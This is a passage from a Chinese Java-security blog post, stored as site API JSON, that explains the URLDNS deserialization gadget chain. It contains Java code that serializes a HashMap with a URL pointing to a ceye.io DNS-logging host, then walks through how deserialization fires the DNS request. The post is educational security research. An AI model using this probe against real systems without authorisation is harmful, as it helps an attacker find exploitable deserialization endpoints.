punctuation\">(</span><span class=\"token string\">\"http://s3moz8.ceye.io\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> hashcodefile <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hashCode\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hashcodefile<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hashcodefile<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hashmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span>\n        hashcodefile<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Serialize</span><span class=\"token punctuation\">(</span>hashmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行序列化文件，接下来运行反序列化文件，而后在<code>ceye.io</code>上查看是否有接收到DNS请求</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305310006954.png\" alt=\"image-20230531000623921\"></p>\n<p>此时可以发现成功接收到请求，证明URLDNS链构造成功。</p>\n<p>总体方向就是反序列化调用hashmap的readobject，hashmap里的object里<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306011249826.png\" alt=\"image-20230601124922747\"></p>\n<p>这样调用了putVal()，所以我们需要去控制这个值才能实现往下走，所以这个时候我们找到了<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306011249803.png\" alt=\"image-20230601124936765\"></p>\n<p>put方法，这个就是我们这里为啥要put这个url，是为了控制key和value，然后往下走，</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306011249903.png\" alt=\"image-20230601124951841\"></p>\n<p>hash里调用了key.hashCode，hash里面是key，而这个key是我们填入的URL，所以此时就来到了URL.hashCode<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306011250250.png\" alt=\"image-20230601125008201\"></p>\n<p>，这个时候我们要想实现DNS请求，必须让他值为-1，所以，我们此时通过反射修改了hashCode值，修改它为-1，让他继续往下走，此时就来到了</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306011250503.png\" alt=\"image-20230601125023429\"></p>\n<p>就会发送DNS请求。</p>\n","feature":true,"text":"JAVA序列化与反序列化JAVA序列化是指把JAVA对象转换为字节序列的过程；反序列化是指把字节序列恢复为JAVA对象的过程。 接下来首先看一个简单的例子。 我们首先来自定义一下Main类，给它赋予两个变量，name和age，具体代码如下 package org.example;...","link":"","photos":[],"count_time":{"symbolsCount":"6.1k","symbolsTime":"6 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JAVA%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">JAVA序列化与反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E7%82%B9\"><span class=\"toc-text\">序列化实现的一些特点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">JAVA反序列化安全问题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">为什么会产生漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E8%83%BD%E5%BD%A2%E5%BC%8F\"><span class=\"toc-text\">可能形式</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#URLDNS%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90\"><span class=\"toc-text\">URLDNS原理分析</span></a></li></ol></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JAVA CC1分析","uid":"e454c72b82fecd0309833abef7aa2d95","slug":"Java CC1","date":"2023-06-07T16:51:30.000Z","updated":"2023-09-03T13:00:22.000Z","comments":true,"path":"api/articles/Java CC1.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032059748.jpeg","text":"前言JAVA安全初级入门者，学习一下CC链加强代码审计能力。 开始之前，先简单引入一些概念知识。 什么是CommonsCollections，这里引用一段话进行解释 Commons：Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的解决...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JAVA IO流","uid":"28fab77566c6f0e9ee58d916e868a3c4","slug":"JAVA IO流","date":"2023-05-28T16:51:30.000Z","updated":"2023-09-03T13:17:52.000Z","comments":true,"path":"api/articles/JAVA IO流.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032117163.jpeg","text":"前言向Drunkbaby师傅学习！ 在学习反序列化之前，首先要对输入输出流有一定的了解 JAVA IO什么是IO，即Input和Output输入与输出，通过IO可以完成硬盘文件的读和写。 流的传输过程： 首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要...","link":"","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}